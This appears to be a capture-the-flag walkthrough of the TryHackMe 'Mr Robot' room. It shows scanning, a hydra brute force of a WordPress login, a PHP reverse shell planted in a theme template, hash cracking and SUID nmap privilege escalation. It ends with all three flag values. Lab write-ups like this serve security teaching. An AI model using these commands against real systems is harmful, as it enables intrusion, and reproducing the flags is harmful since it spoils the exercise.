# Mr Robot CTF

## Overview

Based on the Mr. Robot show, can you root this box?

Room link: https://tryhackme.com/room/mrrobot
Difficulty: **Medium**

## Walkthrough

Running an initial scan against all ports shows ports 22 (SSH), 80 (HTTP), and 443 (HTTPS) responded with only HTTP/S ports open.

```console
$ nmap -p- -T4 <VICTIM IP> -oN scans/initial.nmap
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-18 17:42 GMT
Nmap scan report for <VICTIM IP>
Host is up (0.033s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https

Nmap done: 1 IP address (1 host up) scanned in 93.07 seconds
```

Taking these ports and running a full scan shows the host is running a version of Apache on a Linux host:

```console
$ nmap -p 22,80,443 -A -T4 <VICTIM IP> -oN scans/open_ports.nmap
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-18 17:46 GMT
Nmap scan report for <VICTIM IP>
Host is up (0.031s latency).

PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
Device type: general purpose|specialized|storage-misc|WAP|broadband router
Running (JUST GUESSING): Linux 5.X|3.X|4.X|2.6.X (90%), Crestron 2-Series (87%), HP embedded (87%), Asus embedded (86%)
OS CPE: cpe:/o:linux:linux_kernel:5.4 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4
Aggressive OS guesses: Linux 5.4 (90%), Linux 3.10 - 3.13 (89%), Linux 3.10 - 4.11 (88%), Linux 3.12 (88%), Linux 3.13 (88%), Linux 3.13 or 4.2 (88%), Linux 3.2 - 3.5 (88%), Linux 3.2 - 3.8 (88%), Linux 4.2 (88%), Linux 4.4 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   27.26 ms 10.9.0.1
2   31.80 ms <VICTIM IP>

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.08 seconds
```

Navigating to the website, we see that it is running a simulated terminal:

![Mr Robot - Webpage](/images/mrrobot_webpage.png)

While we manually crawl the website, we can run Gobuster which, when complete, indicates that the website is running Wordpress as its CMS (Content Management System):

```console
$ gobuster dir -u http://<VICTIM IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![Mr Robot - Gobuster](/images/mrrobot_gobuster.png)

As such, we can run `wpscan` against the site. From this we find a `robots.txt` file:

```console
$ wpscan --url http://<VICTIM IP>
```

![Mr Robot - WPScan](/images/mrrobot_wpscan.png)

Accessing `/robots.txt` shows two files are listed, namely `fsocity.dic` and `key-1-of-3.txt`:

![Mr Robot - Robots.txt](/images/mrrobot_robotstxt.png)

Downloading the files:

```console
$ wget http://<VICTIM IP>/fsocity.dic
$ wget http://<VICTIM IP>/key-1-of-3.txt
```

Viewing these files we successfully get **key 1** and a dictionary which we can use against the login form at `/wp-login.php`.

Navigating to `/wp-login.php`, we see we have fairly verbose error messaging when we input credentials:

![Mr Robot - Verbose Errors](mrrobot_verbose_errors.png)

This means we can use this to infer the username as it will likely produce a different error message as it would be valid. Now we capture a request in BurpSuite in order to get the parameters required for the bruteforce.

![Mr Robot - BurpSuite Request](/images/mrrobot_burpsuite_request.png)

In particular, `log=admin&pwd=admin&wp-submit=Log+In` are the parameters we need.

In addition, before we bruteforce, we need to create a new list by filtering down the original `fsocity.dic`, removing all the duplicate entries.

```console
# Count lines in dictionary file
$ cat fsocity.dic | wc -l
858160

# Count lines in filtered dictionary file
$ cat fsocity.dic | sort | uniq | wc -l
11451

# Output filtered content to new file
$ cat fsocity.dic | sort | uniq > fsocity_filtered.dic
```

Now, we use `hydra` to bruteforce the login page for the username:

```console
$ hydra -L fsocity_filtered.dic -p test <VICTIM IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username' -t 30
```

![Mr Robot - Hydra Username](/images/mrrobot_hydra_username.png)

To summarise, the `hydra` command:

- `-L fsocity_filtered.dic`: Uses the filtered `fsocity.dic` file for the list of usernames to try
- `-p test`: Sets the password to `test` for every attempt
- `http-post-form`: Declares that the form we are bruteforcing is using `HTTP POST` requests
- `/wp-login.php`: The target endpoint
- `:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username`: The parameters from our BurpSuite capture
- `-t 30`: Use 30 threads

Now we have the username, `Elliot`, we can use the same technique to get the password:

```console
$ hydra -l Elliot -P fsocity_filtered.dic <VICTIM IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered for the username' -t 30
```

![Mr Robot - Hydra Password](/images/mrrobot_hydra_password.png)

With the credentials `Elliot:ER28-0652`, we can successfully log in to the admin dashboard of the Wordpress site:

![Mr Robot - Wordpress Dashboard](/images/mrrobot_wordpress_dashboard.png)

Navigating through this dashboard, we find that we can edit the PHP code within the Theme Editor (**Appearance->Editor**). As such, we can change the code to a [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell), ensuring to add our attacker IP and password to receive the callback:

![Mr Robot - Callback Details](/images/mrrobot_callback_details.png)

In this instance, we can use the `404.php` as our upload point as this will load whenever we go to a page which does not exist (e.g., `thispagedoesnotexist.php`):

![Mr Robot - 404 Template](/images/mrrobot_404_template.png)

Configure the listener using the port specified in the PHP reverse shell:

```console
$ nc -nvlp <PORT>
```

Navigating to an invalid page results in a callback to our Netcat listener:

![Mr Robot - Netcat Callback](/images/mrrobot_netcat_callback.png)

Stabilising our shell:

```console
$ python -c "import pty; pty.spawn('/bin/bash')"
$ export TERM=xterm
```

Looking through the filesystem, we find a `robot` user with two files listed in their `/home` directory, namely `key-2-of-3.txt` and `password.raw-md5`:

![Mr Robot - Robot User](/images/mrrobot_robot_user.png)

From the above permissions, we are unable to read `key-2-of-3.txt` but we can read `password.raw-md5` which shows it is the credentials for the `robot` user:

```console
$ cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

We can therefore use a tool such as [CrackStation](https://crackstation.net) to retrieve the plaintext password:

![Mr Robot - Crackstation](/images/mrrobot_crackstation.png)

With this we can switch user with the `su` command and read the second flag:

![Mr Robot - Flag 2](/images/mrrobot_flag2.png)

Now we need to escalate privileges to `root` in order to get full access to the machine. One avenue for this is to look for binaries with the SUID bit set which allows a user to gain temporary `root` privileges:

```console
$ find / -type f -perm -4000 2>/dev/null
```

To summarise:

- `/`: Start search from the root `/` of the filesystem
- `-type f`: Look for files
- `-perm -4000`: Look for the SUID bit permission
- `2>/dev/null`: Drop any errors (redirect them to `/dev/null` rather than output them to the terminal)

From the results, we see the user has a copy of `nmap` in their `/usr/local/bin` directory. As such, we can use [Nmap GTFOBins](https://gtfobins.github.io/gtfobins/nmap/#sudo) to spawn an interactive Nmap instance as the `root` user, ultimately popping a shell and completing the privilege escalation:

```console
$ /usr/local/bin/nmap --interactive
nmap> !sh
```

![Mr Robot - Privesc](/images/mrrobot_privesc.png)

Finally, we can retrieve the final flag:

![Mr Robot - Flag 3](/images/mrrobot_flag3.png)

-----

1. What is key 1?

```
073403c8a58a1f80d943455fb30724b9
```

2. What is key 2?

```
822c73956184f694993bede3eb39f959
```

3. What is key 3?

```
04787ddef27c3dee1ee161b21670b4e4
```